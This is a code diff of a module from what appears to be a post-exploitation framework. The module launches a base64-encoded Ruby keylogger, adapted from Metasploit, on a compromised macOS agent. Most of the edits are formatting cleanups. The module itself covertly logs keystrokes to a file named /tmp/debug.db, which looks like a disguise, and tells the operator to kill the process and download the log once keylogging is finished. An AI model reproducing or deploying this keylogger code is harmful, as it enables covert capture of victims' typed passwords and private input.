@@ -1,5 +1,3 @@
-from lib.common import helpers
-
 class Module:
 
     def __init__(self, mainMenu, params=[]):
@@ -16,17 +14,17 @@ class Module:
             'Description': ("Logs keystrokes to the specified file. Ruby based and heavily adapted from MSF's osx/capture/keylog_recorder. Kill the resulting PID when keylogging is finished and download the specified LogFile."),
 
             # True if the module needs to run in the background
-            'Background' : False,
+            'Background': False,
 
             # File extension to save the file as
-            'OutputExtension' : "",
+            'OutputExtension': "",
 
             # if the module needs administrative privileges
-            'NeedsAdmin' : False,
+            'NeedsAdmin': False,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
-            'OpsecSafe' : False,
-            
+            'OpsecSafe': False,
+
             # list of any references/other comments
             'Comments': [
                 "https://github.com/gojhonny/metasploit-framework/blob/master/modules/post/osx/capture/keylog_recorder.rb"
@@ -37,13 +35,13 @@ class Module:
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
-            'Agent' : {
+            'Agent': {
                 # The 'Agent' option is the only one that MUST be in a module
                 'Description'   :   'Agent to keylog.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'LogFile' : {
+            'LogFile': {
                 'Description'   :   'Text file to log keystrokes out to.',
                 'Required'      :   True,
                 'Value'         :   '/tmp/debug.db'
@@ -65,9 +63,8 @@ class Module:
                 if option in self.options:
                     self.options[option]['Value'] = value
 
-
     def generate(self):
-        
+
         logFile = self.options['LogFile']['Value']
 
         # base64'ed launcher of ./data/misc/keylogger.rb from MSF
@@ -78,6 +75,6 @@ time.sleep(1)
 pids = os.popen('ps aux | grep " ruby" | grep -v grep').read()
 print pids
 print "kill ruby PID and download %s when completed"
-""" %(logFile, logFile)
-    
+""" % (logFile, logFile)
+
         return script
